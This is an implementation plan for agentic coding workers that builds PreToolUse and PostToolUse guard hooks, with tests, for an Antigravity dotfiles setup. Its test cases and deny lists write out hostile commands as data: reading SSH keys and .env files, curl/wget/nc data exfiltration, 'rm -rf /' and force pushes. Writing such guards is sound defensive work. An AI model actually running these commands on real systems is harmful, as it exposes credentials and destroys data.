# Antigravity 個人開発高スループットハーネス Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `hhazama/dotfiles` 内に実配置パスと対応する `home/.gemini/` ミラー構造を新設し、個人開発で月 3,000 PR 級の並列・高スループット開発を安全に回す Antigravity ハーネス（設定・ルール・フック・単体テスト・Ansible 連携）を整備する。

**Architecture:** `home/.gemini/antigravity-cli/`（CLI 本体設定と statusline）と `home/.gemini/config/`（`AGENTS.md`、`hooks.json`、`hooks/*.sh`、`plugins.json.sample`）を分離して配置し、Ansible `links` ロールで `~/.gemini/` 配下へファイル／サブディレクトリ単位にリンク（`settings.json` のみ初回コピー）する。すべての `PreToolUse` フックは中立時に `{}` を返して Antigravity 標準サンドボックスを尊重し、破壊的操作・機密アクセスを `deny`、マージ／削除／公開系を `force_ask` でゲートする。

**Tech Stack:** Bash (`set -uo pipefail`), `jq`, `shellcheck`, `shfmt`, `gitleaks`, Ansible (`ansible-playbook`, `ansible-lint`, `yamllint`), JSON, Markdown

**Spec:** `docs/superpowers/specs/2026-11-20-antigravity-harness-design.md`

## Global Constraints

- 公開リポジトリのため、個人情報・会社名・社内ホスト・秘密情報等の固有文字列を 1 行も含めない（`make secrets` / `gitleaks` 通過必須）。
- Antigravity `hooks.json` のトップレベルはフック名、`PreToolUse` / `PostToolUse` は `matcher`＋`hooks` のネスト配列、`Stop` はフラット配列、入出力 JSON キーは camelCase。
- `PreToolUse` フックは中立判定時に必ず `{}` を返し、無条件 `"decision": "allow"` は返さない。
- `PostToolUse` / `Stop` フックは外部コマンドの stdout/stderr を抑制し、常に有効な `{}` のみを stdout に出力して `exit 0`（fail-open）。
- `AGENTS.md` は 24,000 バイト以内（目安 3〜5 KB）。
- コミットメッセージは日本語の Conventional Commits 形式とし、`Co-Authored-By` を付けない。
- 新規・変更シェルスクリプトはすべて `shellcheck` と `shfmt -d` を通過させる。

## Review Focus

- `git push` の refspec 省略時に `cwd` が `main` / `master` ブランチだった場合、`deny` になること（Task 1 でテスト固定）。
- `&&`・`;`・`|`・`$(...)` で連結された複合コマンド内の `git push origin main` や `.env` 読み取りを `deny` できること（Task 1 でテスト固定）。
- Antigravity IDE / 2.0 ツール（`view_file` の `AbsolutePath`、`write_to_file` / `replace_file_content` の `TargetFile`）が `guard-sensitive-files.sh` と `format-on-edit.sh` で抜けずに処理されること（Task 2・Task 3 でテスト固定）。
- `format-on-edit.sh` と `notify-on-stop.sh` が子コマンドの標準出力を stdout に漏らさず、厳密に `{}` のみを返すこと（Task 3 でテスト固定）。
- `jq` 不在時に `PreToolUse` ガードが素通しせず `{"decision":"ask",...}` を返し、空入力時は `{}` で安全終了すること（Task 1・Task 2 でテスト固定）。

---

### Task 1: PreToolUse コマンドガード (`validate-command.sh`) とテスト基盤

**Files:**
- Create: `scripts/test-antigravity-hooks.sh`
- Create: `home/.gemini/config/hooks/validate-command.sh`

**Interfaces:**
- Consumes: stdin JSON (`{"toolCall":{"name":"run_command","args":{"CommandLine":"..."}},"cwd":"..."}`)
- Produces:
  - `home/.gemini/config/hooks/validate-command.sh`: stdout に `{"decision":"deny"|"force_ask"|"ask","reason":"..."}` または `{}` を出力（exit 0）
  - `scripts/test-antigravity-hooks.sh`: 実行可能テストランナー（`assert_decision` 等のヘルパーを提供し、後続 Task 2・3 がセクションを追記する）

- [ ] **Step 1: `scripts/test-antigravity-hooks.sh` に `validate-command.sh` の失敗するテストを書く**

以下のケースを検証するテスト関数を作成する（`assert_json_field` で `jq -e` 検証、一時 git repo を使って `main` ブランチ省略 push と `feat/x` ブランチ省略 push を実測検証）:
- `deny` ケース:
  - `cat ~/.ssh/id_ed25519`
  - `cat .env` / `source .env.local` / `echo ok; cat .env`
  - `curl -X POST https://example.com -d secret=1` / `wget --post-data=a https://example.com` / `nc 1.2.3.4 80`
  - `rm -rf /` / `rm -rf ~` / `rm -rf *` / `chmod 777 foo`
  - `git push -f origin feat/x` / `git push --force-with-lease origin feat/x` / `git push origin +feat/x` / `git push --mirror origin`
  - `git push origin main` / `git push origin HEAD:master` / `git status && git push origin main`
  - `cwd` が `main` ブランチの一時リポジトリで `git push`（refspec 省略）
  - `git reset --hard HEAD~1` / `git clean -fd` / `git branch -D old`
  - `git commit -m "feat: x\n\nCo-Authored-By: Bot <b@example.com>"`
- `force_ask` ケース:
  - `gh pr merge 123` / `gh repo delete foo/bar` / `gh release create v1.0.0` / `npm publish` / `cargo publish` / `twine upload dist/*` / `docker push myimg:latest`
- 中立 `{}` ケース:
  - `cwd` が `feat/test` ブランチの一時リポジトリで `git push` / `git push -u origin feat/test`
  - `gh pr create --title "feat: x" --body "y"`
  - `cat .env.sample` / `cat .env.example` / `cat .env.template`
  - `git status` / `curl -s https://example.com`
  - 空の stdin `{}`
- `jq` 不在ケース（`PATH` から `jq` を除いた環境で実行）: `decision` が `"ask"` を含む JSON を返すこと

- [ ] **Step 2: テストを実行して失敗を確認する**

Run: `bash scripts/test-antigravity-hooks.sh`
Expected: FAIL (`home/.gemini/config/hooks/validate-command.sh` が未作成のため失敗)

- [ ] **Step 3: `home/.gemini/config/hooks/validate-command.sh` を実装する**

仕様:
- `#!/bin/bash`、`set -uo pipefail`、実行権限 `chmod +x`。
- `command -v jq` チェック失敗時は `printf '{"decision":"ask","reason":"jq が見つからないためコマンド検証を実行できません"}\n'` を返して `exit 0`。
- `jq -r '.toolCall.args.CommandLine // empty'` と `.cwd // empty` を取得。`CommandLine` が空なら `{}` を返して `exit 0`。
- ヘルパー `emit_decision <decision> <reason>` で `jq -nc --arg d "$1" --arg r "$2" '{decision: $d, reason: $r}'` を出力。
- 判定順序は設計書 Section 2.5.1 の通り（機密パス → `.env` 読み取り（`.env.sample`/`.env.example`/`.env.template` 除外） → 外部データ送信 → 破壊的ファイル操作 → 破壊的 git & デフォルトブランチ直 push（明示 refspec＋`cwd` の `git rev-parse --abbrev-ref HEAD` チェック） → `Co-Authored-By` → `force_ask` 対外不可逆操作 → 中立 `{}`）。
- 会社固有パスや組織固有の例外ルールは一切含めない。

- [ ] **Step 4: テストと lint を実行して通過を確認する**

Run: `bash scripts/test-antigravity-hooks.sh && shellcheck home/.gemini/config/hooks/validate-command.sh scripts/test-antigravity-hooks.sh && shfmt -d home/.gemini/config/hooks/validate-command.sh scripts/test-antigravity-hooks.sh`
Expected: 全テスト PASS、lint エラー 0

- [ ] **Step 5: コミットする**

```bash
git add home/.gemini/config/hooks/validate-command.sh scripts/test-antigravity-hooks.sh
git commit -m "feat: Antigravity 用 PreToolUse コマンドガードとテスト基盤を追加"
```

---

### Task 2: PreToolUse 機密ファイルガード (`guard-sensitive-files.sh`)

**Files:**
- Modify: `scripts/test-antigravity-hooks.sh`
- Create: `home/.gemini/config/hooks/guard-sensitive-files.sh`

**Interfaces:**
- Consumes: stdin JSON (`{"toolCall":{"name":"read_file|write_file|edit_file|view_file|write_to_file|replace_file_content|multi_replace_file_content","args":{"Path"|"AbsolutePath"|"TargetFile"|"path":"..."}}}`)
- Produces: `home/.gemini/config/hooks/guard-sensitive-files.sh`: stdout に `{"decision":"deny"|"force_ask"|"ask","reason":"..."}` または `{}` を出力（exit 0）

- [ ] **Step 1: `scripts/test-antigravity-hooks.sh` に `guard-sensitive-files.sh` の失敗するテストを追記する**

検証ケース:
- `deny` ケース:
  - `read_file` with `Path: "/home/user/.ssh/id_ed25519"`
  - `view_file` with `AbsolutePath: "/home/user/.aws/credentials"`（IDE/2.0 形式）
  - `write_to_file` with `TargetFile: "/repo/.env.local"`（IDE/2.0 形式）
  - `edit_file` with `Path: "./config/credentials.json"`
  - `read_file` with `Path: "/repo/certs/server.key"` / `"/repo/certs/cert.pem"`
  - `read_file` with `Path: "~/.gnupg/secring.gpg"` / `"~/.npmrc"` / `"~/.git-credentials"`
- `force_ask` ケース:
  - `edit_file` with `Path: "/home/user/.zshrc"`
  - `write_to_file` with `TargetFile: "~/.bashrc"`
  - `replace_file_content` with `TargetFile: "/home/user/.profile"`
- 中立 `{}` ケース:
  - `read_file` with `Path: "/home/user/.zshrc"`（読み取りは許可）
  - `read_file` with `Path: "/repo/.env.sample"` / `"/repo/.env.example"` / `"/repo/.env.template"`
  - `edit_file` with `Path: "/repo/src/main.ts"`
  - 空の stdin `{}`
- `jq` 不在ケース: `decision` が `"ask"` を返すこと

- [ ] **Step 2: テストを実行して失敗を確認する**

Run: `bash scripts/test-antigravity-hooks.sh`
Expected: FAIL (`guard-sensitive-files.sh` 未作成)

- [ ] **Step 3: `home/.gemini/config/hooks/guard-sensitive-files.sh` を実装する**

仕様:
- `#!/bin/bash`、`set -uo pipefail`、実行権限 `chmod +x`。
- `jq` 不在時は `{"decision":"ask","reason":"jq が見つからないためファイルアクセス検証を実行できません"}` を返して `exit 0`。
- `.toolCall.name // empty` と `.toolCall.args.Path // .toolCall.args.AbsolutePath // .toolCall.args.TargetFile // .toolCall.args.path // empty` を取得。パスが空なら `{}`。
- 機密パス照合は `.env.sample` / `.env.example` / `.env.template` を除外した上で、`.ssh/`, `.aws/`, `.azure/`, `.config/gcloud/`, `.gnupg/`, `.docker/`, `.netrc`, `.npmrc`, `.git-credentials`, `credentials.json`, `*.pem`, `*.key`, `.env`, `.env.*` に一致したら `deny`。
- ツール名が `write_file|edit_file|write_to_file|replace_file_content|multi_replace_file_content` かつパス末尾が `/.bashrc` / `/.zshrc` / `/.profile`（または `~/` 表現）なら `force_ask`。
- それ以外は `{}`。

- [ ] **Step 4: テストと lint を実行して通過を確認する**

Run: `bash scripts/test-antigravity-hooks.sh && shellcheck home/.gemini/config/hooks/guard-sensitive-files.sh scripts/test-antigravity-hooks.sh && shfmt -d home/.gemini/config/hooks/guard-sensitive-files.sh scripts/test-antigravity-hooks.sh`
Expected: 全テスト PASS、lint エラー 0

- [ ] **Step 5: コミットする**

```bash
git add home/.gemini/config/hooks/guard-sensitive-files.sh scripts/test-antigravity-hooks.sh
git commit -m "feat: Antigravity 用機密ファイル保護フックを追加"
```

---

### Task 3: PostToolUse フォーマッタ (`format-on-edit.sh`)・Stop 通知 (`notify-on-stop.sh`)・`hooks.json`

**Files:**
- Modify: `scripts/test-antigravity-hooks.sh`
- Create: `home/.gemini/config/hooks/format-on-edit.sh`
- Create: `home/.gemini/config/hooks/notify-on-stop.sh`
- Create: `home/.gemini/config/hooks.json`

**Interfaces:**
- Consumes:
  - `format-on-edit.sh`: stdin JSON (`{"toolCall":{"name":"...","args":{"Path"|"TargetFile"|"path":"..."}},"error":"..."}`)
  - `notify-on-stop.sh`: stdin JSON (`{"terminationReason":"..."}`)
  - `hooks.json`: `./hooks/validate-command.sh`, `./hooks/guard-sensitive-files.sh`, `./hooks/format-on-edit.sh`, `./hooks/notify-on-stop.sh`
- Produces:
  - `format-on-edit.sh` / `notify-on-stop.sh`: 厳密に `{}` のみを stdout に出力（exit 0）
  - `home/.gemini/config/hooks.json`: Antigravity 形式のフック定義

- [ ] **Step 1: `scripts/test-antigravity-hooks.sh` に `format-on-edit.sh`, `notify-on-stop.sh`, `hooks.json` の失敗するテストを追記する**

検証ケース:
- `format-on-edit.sh`:
  - 未整形の一時 `.sh` ファイルを `Path` で渡すと `shfmt` があれば整形され、stdout が厳密に `{}`（1行・余計な出力なし）かつ exit 0
  - IDE/2.0 の `TargetFile` キーでも同様に動作し stdout が厳密に `{}`
  - `"error": "failed"` が付いたペイロードではファイルを変更せず `{}` を返す
  - 存在しないファイルパスでは `{}` を返し exit 0
  - `biome.json` / prettier 設定のない一時ディレクトリの `.ts` ファイルは変更せず `{}` を返す
- `notify-on-stop.sh`:
  - モックの `claude-notify.sh` / `claude-tmux-notify.sh`（stdout にノイズを出すスクリプト）を先頭 `PATH` に置いたとき、両方が呼ばれ、かつフックの stdout は厳密に `{}`（ノイズが漏れない）
  - 両コマンドが `PATH` にない環境でも stdout が厳密に `{}` で exit 0
- `hooks.json`:
  - `jq empty home/.gemini/config/hooks.json` が成功
  - 4 つの名前付きフック（`command-guard`, `sensitive-file-guard`, `format-on-edit`, `notify-on-stop`）が存在し、各 `command` で参照する `./hooks/*.sh` が `home/.gemini/config/` 配下に実行可能ファイルとして存在する

- [ ] **Step 2: テストを実行して失敗を確認する**

Run: `bash scripts/test-antigravity-hooks.sh`
Expected: FAIL (`format-on-edit.sh`, `notify-on-stop.sh`, `hooks.json` 未作成)

- [ ] **Step 3: `format-on-edit.sh`, `notify-on-stop.sh`, `hooks.json` を実装する**

仕様:
- `format-on-edit.sh` (`chmod +x`):
  - `jq` あり・`error` 空・対象ファイル存在を確認。
  - `.sh`/`.bash` → `shfmt -w`、`.go` → `gofmt -w`、`.rs` → `rustfmt`、`.py` → `ruff format --quiet`。
  - `.js`/`.jsx`/`.ts`/`.tsx`/`.json`/`.css`/`.scss`/`.md`/`.yaml`/`.yml` → ファイルの親ディレクトリを遡ってプロジェクトルートを探索し、`node_modules/.bin/biome`＋(`biome.json` or `biome.jsonc`) があれば `biome format --write`、なければ `node_modules/.bin/prettier`＋prettier 設定（`.prettierrc*` or `prettier.config.*`）があれば `prettier --write`。
  - すべてのフォーマッタ実行は `>/dev/null 2>&1 || true` で抑制し、最後に `printf '{}\n'` して `exit 0`。
- `notify-on-stop.sh` (`chmod +x`):
  - stdin を消費（`cat >/dev/null`）した上で、`claude-notify.sh "処理が完了しました"` と `claude-tmux-notify.sh` を `command -v` で存在確認しつつ `>/dev/null 2>&1 || true` で実行し、`printf '{}\n'` で `exit 0`。
- `home/.gemini/config/hooks.json`: 設計書 Section 2.4 の JSON をそのまま配置。

- [ ] **Step 4: テストと lint を実行して通過を確認する**

Run: `bash scripts/test-antigravity-hooks.sh && shellcheck home/.gemini/config/hooks/*.sh scripts/test-antigravity-hooks.sh && shfmt -d home/.gemini/config/hooks/*.sh scripts/test-antigravity-hooks.sh`
Expected: 全テスト PASS、lint エラー 0

- [ ] **Step 5: コミットする**

```bash
git add home/.gemini/config/hooks/format-on-edit.sh home/.gemini/config/hooks/notify-on-stop.sh home/.gemini/config/hooks.json scripts/test-antigravity-hooks.sh
git commit -m "feat: Antigravity 用フォーマット・完了通知フックと hooks.json を追加"
```

---

### Task 4: `home/.gemini/` 設定ファイル群の配置と旧 `config/antigravity-settings/` の移行

**Files:**
- Move: `config/antigravity-settings/statusline-command.sh` → `home/.gemini/antigravity-cli/statusline-command.sh`
- Remove: `config/antigravity-settings/settings.json`
- Create: `home/.gemini/antigravity-cli/settings.json`
- Create: `home/.gemini/config/AGENTS.md`
- Create: `home/.gemini/config/plugins.json.sample`

**Interfaces:**
- Consumes: 既存 `config/antigravity-settings/statusline-command.sh`
- Produces: `home/.gemini/` 一式（Task 5 の Ansible `links` ロールが参照する）

- [ ] **Step 1: `statusline-command.sh` を移設し、`settings.json`, `AGENTS.md`, `plugins.json.sample` を作成する**

- `git mv config/antigravity-settings/statusline-command.sh home/.gemini/antigravity-cli/statusline-command.sh`
- `git rm config/antigravity-settings/settings.json`
- `home/.gemini/antigravity-cli/settings.json`: 設計書 Section 2.1 の JSON（`agentMode: "auto"`, `enableTerminalSandbox: true`, `statusLine`）。
- `home/.gemini/config/AGENTS.md`: 設計書 Section 2.3 の個人開発・月 3,000 PR 憲法（日本語、3〜5 KB 以内、会社名・個人情報ゼロ）。
- `home/.gemini/config/plugins.json.sample`: 設計書 Section 2.6 の外付けプラグインサンプル JSON。

- [ ] **Step 2: 構文・サイズ・機密チェックを実行する**

Run:
```bash
jq empty home/.gemini/antigravity-cli/settings.json home/.gemini/config/plugins.json.sample
test "$(wc -c < home/.gemini/config/AGENTS.md)" -lt 24000
shellcheck home/.gemini/antigravity-cli/statusline-command.sh
shfmt -d home/.gemini/antigravity-cli/statusline-command.sh
```
Expected: すべて exit 0

- [ ] **Step 3: コミットする**

```bash
git add home/.gemini/antigravity-cli/ home/.gemini/config/AGENTS.md home/.gemini/config/plugins.json.sample config/antigravity-settings/
git commit -m "feat: home/.gemini ミラー構造と Antigravity 基本設定・AGENTS.md を配置"
```

---

### Task 5: Ansible `links` ロール・`Makefile`・`CLAUDE.md` 更新と全体検証

**Files:**
- Modify: `ansible/vars/default.yml:1-19`
- Modify: `ansible/roles/links/tasks/main.yml:20-81`
- Modify: `Makefile:1-10`
- Modify: `CLAUDE.md:49-63`

**Interfaces:**
- Consumes: Task 1〜4 で作成した `home/.gemini/` 一式と `scripts/test-antigravity-hooks.sh`
- Produces: `make check` / `make lint` / `make secrets` 通過済みの dotfiles 全体構成

- [ ] **Step 1: `ansible/vars/default.yml` に `home_directory_path` を追加する**

`config_directory_path` の直下に `home_directory_path: "{{ repo_root_path }}/home"` を追加。

- [ ] **Step 2: `ansible/roles/links/tasks/main.yml` を更新する**

変更点:
1. `links | make claude and antigravity config directories` に `"{{ ansible_exec_user_home }}/.gemini/config"` を追加。
2. `links | create symlink` の Antigravity エントリを `home_directory_path` 参照へ切り替え・追加:
   - `{{ home_directory_path }}/.gemini/antigravity-cli/statusline-command.sh` → `{{ ansible_exec_user_home }}/.gemini/antigravity-cli/statusline-command.sh` (`force: yes`)
   - `{{ home_directory_path }}/.gemini/config/AGENTS.md` → `{{ ansible_exec_user_home }}/.gemini/config/AGENTS.md` (`force: yes`)
   - `{{ home_directory_path }}/.gemini/config/hooks.json` → `{{ ansible_exec_user_home }}/.gemini/config/hooks.json` (`force: yes`)
   - `{{ home_directory_path }}/.gemini/config/hooks` → `{{ ansible_exec_user_home }}/.gemini/config/hooks` (`force: yes`)
3. 旧リンク掃除タスクを追加: `{{ xdg_config_home }}/antigravity-settings` を `file: state: absent` で削除（存在時のみ）。
4. 既存 `links | copy claude settings.json (initial only)` の前に `stat` タスクを追加し、`when: claude_misc_settings.stat.exists` を付与（社内リポジトリが無い個人マシンで `--tags links` が中断しないようにする）。
5. `links | copy antigravity settings.json (initial only)` の `src` を `{{ home_directory_path }}/.gemini/antigravity-cli/settings.json` へ変更（`force: no`, `mode: "0644"` 維持）。

- [ ] **Step 3: `Makefile` と `CLAUDE.md` を更新する**

- `Makefile` の `SHELL_FILES`: `config/antigravity-settings/statusline-command.sh` を `home/.gemini/antigravity-cli/statusline-command.sh` へ変更し、`home/.gemini/config/hooks/*.sh` の 4 ファイルと `scripts/test-antigravity-hooks.sh` を追加。
- `CLAUDE.md`: ディレクトリ構成に `home/`（ホーム直下ミラー管理。`~/.gemini/` 等へ Ansible `links` ロールでリンク／初回コピー）を追記。

- [ ] **Step 4: 全自動検証（単体テスト・lint・秘密情報・Ansible dry-run）を実行する**

Run:
```bash
bash scripts/test-antigravity-hooks.sh
make lint
make secrets
make check
```
Expected:
- `test-antigravity-hooks.sh`: 全 PASS
- `make lint`: 新規・変更ファイルに `shellcheck` / `shfmt` / `yamllint` / `ansible-lint` エラーなし
- `make secrets`: leaks 0 件
- `make check`: `ansible-playbook --check --diff --tags links` がエラーなく完走し、`home/.gemini/` のリンク差分が表示される

- [ ] **Step 5: コミットする**

```bash
git add ansible/vars/default.yml ansible/roles/links/tasks/main.yml Makefile CLAUDE.md
git commit -m "feat: Ansible links ロールと Makefile を home/.gemini 構成に対応"
```

- [ ] **Step 6: 実環境へ `--tags links` を適用して反映確認する**

Run:
```bash
cd ansible && ansible-playbook -i ./hosts/local --extra-vars ansible_exec_user="$USER" --extra-vars ansible_exec_user_home="$HOME" --tags links ./site.yml
```
Expected: `~/.gemini/config/{AGENTS.md,hooks.json,hooks}` と `~/.gemini/antigravity-cli/statusline-command.sh` が正しくリンクされ、旧 `~/.config/antigravity-settings` が除去される。既存の `~/.gemini/antigravity-cli/settings.json` に `agentMode` / `enableTerminalSandbox` が入っているか確認し、未設定なら反映手順を案内する。
